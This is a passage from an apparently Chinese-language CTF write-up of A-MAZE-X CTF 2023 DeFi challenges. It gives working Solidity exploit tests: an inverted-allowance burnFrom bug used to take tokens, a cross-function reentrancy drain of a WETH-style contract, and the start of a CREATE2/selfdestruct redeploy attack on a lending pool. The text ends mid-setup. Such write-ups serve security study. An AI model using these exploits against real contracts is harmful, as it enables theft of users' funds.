+  <a href="#3-lendex-pool-hack" class="md-nav__link">
+    3. LendEx pool hack 🤺🃏
+  </a>
+  
+    <nav class="md-nav" aria-label="3. LendEx pool hack 🤺🃏">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_2" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-operation-rescue-posi-token" class="md-nav__link">
+    4. Operation Rescue POSI Token 💼🔓
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Operation Rescue POSI Token 💼🔓">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_3" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-balloon-vault" class="md-nav__link">
+    5. Balloon Vault 🎈🎈
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Balloon Vault 🎈🎈">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_4" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-safe-yield" class="md-nav__link">
+    6. Safe Yield? 🏦📈
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Safe Yield? 🏦📈">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_5" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-crystal-dao" class="md-nav__link">
+    7. Crystal DAO 💎💎
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Crystal DAO 💎💎">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_6" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-liquidatoooor" class="md-nav__link">
+    8. Liquidatoooor 🔱🔱
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Liquidatoooor 🔱🔱">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_7" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+  
+
+  
+                
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/wargames/defi_security_summit.md" title="编辑此页" class="md-content__button md-icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+
+  <h1>A-MAZE-X CTF 2023</h1>
+
+<div class="md-typeset">
+    <div class="blogging-tags-grid">
+
+        <a href="#blockchain" class="blogging-tag"><code>#blockchain</code></a>
+
+        <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>
+
+        <a href="#DeFi" class="blogging-tag"><code>#DeFi</code></a>
+
+        <a href="#access control" class="blogging-tag"><code>#access control</code></a>
+
+        <a href="#cross-function reentrancy" class="blogging-tag"><code>#cross-function reentrancy</code></a>
+
+        <a href="#create2" class="blogging-tag"><code>#create2</code></a>
+
+        <a href="#phantom function" class="blogging-tag"><code>#phantom function</code></a>
+
+        <a href="#inflation attack" class="blogging-tag"><code>#inflation attack</code></a>
+
+    </div>
+
+
+</div>
+
+<style>
+    .md-typeset .blogging-tags-grid {
+        display: flex;
+        flex-direction: row;
+        flex-wrap: wrap;
+        gap: 8px;
+        margin-top: 5px;
+    }
+
+    .md-typeset .blogging-tag {
+        color: var(--md-typeset-color);
+        background-color: var(--md-typeset-code-color);
+        white-space: nowrap;
+        display: block;
+    }
+
+    .md-typeset .blogging-tag code {
+        border-radius: 5px;
+    }
+</style>
+<h2 id="1-operation-magic-redemption">1. Operation magic redemption 🪄🔮<a class="headerlink" href="#1-operation-magic-redemption" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Recover <code>1000 mETH</code> from the <em>exploiter wallet</em>.</p>
+<p>Convert the <code>mETH</code> to <code>ETH</code> to avoid further losses.</p>
+</blockquote>
+<ul>
+<li><code>burnFrom()</code> 中在获取 <code>currentAllowance</code> 时，实际得到的是 <code>_allowances[spender][owner]</code>，而 <code>_approve()</code> 的传参顺序是正确的</li>
+<li>可通过 <code>burnFrom()</code> 来取得转移 <code>exploiter</code> 持有代币的权限</li>
+</ul>
+<div class="highlight"><pre><span></span><code>function allowance(address owner, address spender) public view virtual override returns (uint256) {
+<span class="w"> </span>   return _allowances[owner][spender];
+}
+
+function burnFrom(address account, uint256 amount) public {
+<span class="gd">-    uint256 currentAllowance = allowance(msg.sender, account);</span>
+<span class="gi">+    uint256 currentAllowance = allowance(account, msg.sender);</span>
+<span class="w"> </span>   require(currentAllowance &gt;= amount, &quot;ERC20: insufficient allowance&quot;);
+
+<span class="w"> </span>   // decrease allowance
+<span class="w"> </span>   _approve(account, msg.sender, currentAllowance - amount);
+
+<span class="w"> </span>   // burn
+<span class="w"> </span>   _burn(account, amount);
+}
+</code></pre></div>
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge1Test</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">MagicETH</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">mETH</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">exploiter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;exploiter&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">whitehat</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;whitehat&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">mETH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">MagicETH</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">mETH</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span>
+<span class="w">        </span><span class="c1">// exploiter is in control of 1000 tokens</span>
+<span class="w">        </span><span class="nx">mETH</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">exploiter</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">whitehat</span><span class="p">,</span><span class="w"> </span><span class="nx">whitehat</span><span class="p">);</span>
+<span class="w">        </span><span class="cm">/*////////////////////////////////////////////////////</span>
+<span class="cm">        //               Add your hack below!               //</span>
+<span class="cm">        //                                                  //</span>
+<span class="cm">        // terminal command to run the specific test:       //</span>
+<span class="cm">        // forge test --match-contract Challenge1Test -vvvv //</span>
+<span class="cm">        ////////////////////////////////////////////////////*/</span>
+<span class="w">        </span><span class="nx">mETH</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">exploiter</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">mETH</span><span class="p">.</span><span class="nx">burnFrom</span><span class="p">(</span><span class="nx">exploiter</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">mETH</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">exploiter</span><span class="p">,</span><span class="w"> </span><span class="nx">whitehat</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">mETH</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="c1">//==================================================//</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">whitehat</span><span class="p">.</span><span class="nx">balance</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;whitehat should have 1000 ether&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="2-mission-modern-weth-rescue-the-ether">2. Mission Modern WETH: Rescue the Ether 🧗🧭<a class="headerlink" href="#2-mission-modern-weth-rescue-the-ether" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Starting with <strong>10 ETH</strong>, recover <code>1000 ETH</code> from the <code>ModernWETH</code> contract.</p>
+<p>Recover all <code>ETH</code> to avoid further losses from <code>ModernWETH</code> contract. Whitehat hacker should end up with <strong>1010 ETH</strong>.</p>
+</blockquote>
+<ul>
+<li>由于 <code>_burnAll()</code> 基于 <code>msg.sender</code> 的当前余额进行代币销毁，因而可以在回调函数中将持有的代币转移到可控账户</li>
+<li>利用持有的代币反复调用 <code>withdrawAll()</code></li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">deposit</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">withdrawAll</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">nonReentrant</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;mWETH: ETH transfer failed&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="nx">_burnAll</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">_burnAll</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">_burn</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="exploit_1">Exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="cm">/*////////////////////////////////////////////////////////////</span>
+<span class="cm">//          DEFINE ANY NECESSARY CONTRACTS HERE             //</span>
+<span class="cm">//    If you need a contract for your hack, define it below //</span>
+<span class="cm">////////////////////////////////////////////////////////////*/</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Executor</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">ModernWETH</span><span class="w"> </span><span class="nx">mWETH</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_mWETH</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">mWETH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ModernWETH</span><span class="p">(</span><span class="nx">_mWETH</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">execute</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">mWETH</span><span class="p">.</span><span class="nx">withdrawAll</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">mWETH</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="nx">mWETH</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+<span class="w">        </span><span class="nx">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+<span class="cm">/*////////////////////////////////////////////////////////////</span>
+<span class="cm">//                     TEST CONTRACT                        //</span>
+<span class="cm">////////////////////////////////////////////////////////////*/</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge2Test</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">ModernWETH</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">modernWETH</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">whitehat</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;whitehat&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">modernWETH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">ModernWETH</span><span class="p">();</span>
+
+<span class="w">        </span><span class="c1">/// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">whale</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;whale&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">deal</span><span class="p">(</span><span class="nx">whale</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">whale</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">modernWETH</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">1000</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span>
+
+<span class="w">        </span><span class="c1">/// @dev you, the whitehat, start with 10 ether</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">deal</span><span class="p">(</span><span class="nx">whitehat</span><span class="p">,</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testWhitehatRescue</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">whitehat</span><span class="p">,</span><span class="w"> </span><span class="nx">whitehat</span><span class="p">);</span>
+<span class="w">        </span><span class="cm">/*////////////////////////////////////////////////////</span>
+<span class="cm">        //               Add your hack below!               //</span>
+<span class="cm">        //                                                  //</span>
+<span class="cm">        // terminal command to run the specific test:       //</span>
+<span class="cm">        // forge test --match-contract Challenge2Test -vvvv //</span>
+<span class="cm">        ////////////////////////////////////////////////////*/</span>
+<span class="w">        </span><span class="nx">Executor</span><span class="w"> </span><span class="nx">executor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Executor</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">modernWETH</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">;</span>
+<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">modernWETH</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">modernWETH</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">whitehat</span><span class="p">.</span><span class="nx">balance</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">modernWETH</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">whitehat</span><span class="p">.</span><span class="nx">balance</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">modernWETH</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">amount</span><span class="p">}();</span>
+<span class="w">            </span><span class="nx">modernWETH</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">executor</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">executor</span><span class="p">.</span><span class="nx">execute</span><span class="p">();</span>
+<span class="w">            </span><span class="nx">modernWETH</span><span class="p">.</span><span class="nx">withdrawAll</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="c1">//==================================================//</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">modernWETH</span><span class="p">).</span><span class="nx">balance</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;ModernWETH balance should be 0&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="c1">// @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue</span>
+<span class="w">        </span><span class="nx">assertEq</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">whitehat</span><span class="p">).</span><span class="nx">balance</span><span class="p">,</span><span class="w"> </span><span class="mf">1010</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;whitehat should end with 1010 ether&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="3-lendex-pool-hack">3. LendEx pool hack 🤺🃏<a class="headerlink" href="#3-lendex-pool-hack" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>You have to fill the shoes of the hacker and execute the exploit by stealing stablecoins from a lending pool.</p>
+</blockquote>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Foundry has a bug. If a selfdestruct() is triggered in a test script then it has to be done in the setUp() function and the rest of the code should be in a different function otherwise foundry test script does not see that selfdestruct happened to a contract.</p>
+</div>
+<ul>
+<li>
+<p><code>hacker</code> 通过 <code>CreateDeployer</code> 部署了 <code>LendingPool</code>，而 <code>CreateDeployer</code> 由 <code>Create2Deployer</code> 部署</p>
+<div class="highlight"><pre><span></span><code><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">hacker</span><span class="p">);</span>
+<span class="nx">create2Deployer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Create2Deployer</span><span class="p">();</span>
+<span class="nx">createDeployer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CreateDeployer</span><span class="p">(</span><span class="nx">create2Deployer</span><span class="p">.</span><span class="nx">deploy</span><span class="p">());</span>
+<span class="nx">lendingPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">LendingPool</span><span class="p">(</span><span class="nx">createDeployer</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">usdc</span><span class="p">)));</span>
+<span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>CreateDeployer</code> 以及 <code>LendingPool</code> 的 <code>owner</code> 可以让合约自毁</p>
+</li>
+<li><code>CREATE</code> 根据 <code>sender</code> 和 <code>nonce</code> 计算部署合约的地址，<code>CreateDeployer</code> 自毁后，<code>nonce</code> 被重置，而 <code>CreateDeployer</code> 由 <code>CREATE2</code> 创建，因此可以在同一地址上部署不同的合约</li>
+<li><code>LendingPool</code> 所在地址持有的 USDC 不受自毁的影响</li>
+</ul>
+<h3 id="exploit_2">Exploit<a class="headerlink" href="#exploit_2" title="Permanent link">&para;</a></h3>
+<div class="admonition note">
+<p class="admonition-title">LendingHack.sol</p>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">LendingHack</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="cm">/*//////////////////////////////</span>
+<span class="cm">    //    Add your hack below!    //</span>
+<span class="cm">    //////////////////////////////*/</span>
+<span class="w">    </span><span class="nx">string</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;LendingPool hack&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="cm">/**</span>
+<span class="cm">     * @dev Constructor that sets the owner of the contract</span>
+<span class="cm">     * @param _usdc The address of the USDC contract to use</span>
+<span class="cm">     * @param _owner The address of the owner of the contract</span>
+<span class="cm">     */</span>
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_owner</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_usdc</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">USDC</span><span class="w"> </span><span class="nx">usdc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">USDC</span><span class="p">(</span><span class="nx">_usdc</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">usdc</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">_owner</span><span class="p">,</span><span class="w"> </span><span class="nx">usdc</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1">//============================//</span>
+<span class="p">}</span>
+</code></pre></div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Challenge3.t.sol</p>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge3Test</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">USDC</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">usdc</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">usdcAmount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">100000</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">LendExGovernor</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">lendExGovernor</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">CreateDeployer</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">createDeployer</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">Create2Deployer</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">create2Deployer</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">LendingPool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">lendingPool</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">LendingHack</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">lendingHack</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">hacker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;hacker&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">governanceOwner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">makeAddr</span><span class="p">(</span><span class="s2">&quot;governanceOwner&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setUp</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="cm">/* set up actions */</span>
+<span class="w">        </span><span class="nx">usdc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">USDC</span><span class="p">(</span><span class="nx">usdcAmount</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">usdc</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">governanceOwner</span><span class="p">,</span><span class="w"> </span><span class="nx">usdcAmount</span><span class="p">);</span>
+
+<span class="w">        </span><span class="cm">/* sending transactions as hacker */</span>
+<span class="w">        </span><span class="c1">// deploying the LendingPool contract</span>
+<span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">hacker</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">create2Deployer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Create2Deployer</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">createDeployer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CreateDeployer</span><span class="p">(</span><span class="nx">create2Deployer</span><span class="p">.</span><span class="nx">deploy</span><span class="p">());</span>
+<span class="w">        </span><span class="nx">lendingPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">LendingPool</span><span class="p">(</span><span class="nx">createDeployer</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">usdc</span><span class="p">)));</span>
